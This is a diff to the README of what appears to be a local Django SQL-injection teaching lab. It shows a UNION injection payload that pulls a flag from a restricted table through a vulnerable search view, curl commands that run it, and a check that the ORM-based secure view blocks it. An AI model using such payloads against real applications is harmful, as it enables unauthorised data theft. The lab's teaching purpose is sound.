@@ -23,30 +23,53 @@ Both expose the same "search notes by title" feature. The public data lives in
 `sqli_note`. The CTF flag lives in a separate table, `sqli_flag`, that the search
 feature has no business reading.
 
-## Capture the flag
+## Run it
 
-Run the stack (`docker compose up`, then browse to
-`http://127.0.0.1:8000/sql-injection/vulnerable/`) and pass this as `q`:
-
-```
-' UNION SELECT id, 'x', value FROM sqli_flag -- 
+```bash
+docker compose up            # Postgres + Django on http://127.0.0.1:8000
 ```
 
-The query the view sends becomes:
+Everything below is `curl` against that stack — no browser needed.
+
+## Test the pair from the command line
+
+The exploit is a `UNION` that reads the off-limits `sqli_flag` table through the
+search box. Send it as `q` to the **vulnerable** view and the flag comes back in
+the results:
+
+```bash
+curl -sG 'http://127.0.0.1:8000/sql-injection/vulnerable/' \
+     --data-urlencode "q=' UNION SELECT id, 'x', value FROM sqli_flag -- " \
+  | grep -o 'FLAG{[^}]*}' | head -1
+# FLAG{sql_injection_via_raw_string_interpolation}
+```
+
+Behind the search box the view builds:
 
 ```sql
 SELECT id, title, body FROM sqli_note WHERE title LIKE '%' UNION SELECT id, 'x', value FROM sqli_flag -- %'
 ```
 
 The `'%'` closes the intended `LIKE` literal, the `UNION` appends every row of
-`sqli_flag`, and `-- ` comments out the trailing `%'`. The flag
-`FLAG{sql_injection_via_raw_string_interpolation}` appears in the results.
+`sqli_flag`, and `-- ` comments out the trailing `%'`.
 
-Send the **same** payload to `/sql-injection/secure/` and nothing leaks: the ORM
-binds it as a single literal search string, so it matches no note titles and
-never reaches `sqli_flag`.
+Send the **same** payload to the **secure** view and nothing leaks — the ORM
+binds it as one literal search string, so it matches no note titles and never
+reaches `sqli_flag`:
 
-`tests.py` asserts both outcomes — it is the runnable proof, not a screenshot.
+```bash
+curl -sG 'http://127.0.0.1:8000/sql-injection/secure/' \
+     --data-urlencode "q=' UNION SELECT id, 'x', value FROM sqli_flag -- " \
+  | grep -c 'FLAG{'
+# 0
+```
+
+Or prove both outcomes in one command — `tests.py` is the runnable proof, not a
+screenshot:
+
+```bash
+docker compose run --rm web python manage.py test labs.post_01_sql_injection
+```
 
 ## The fix
 
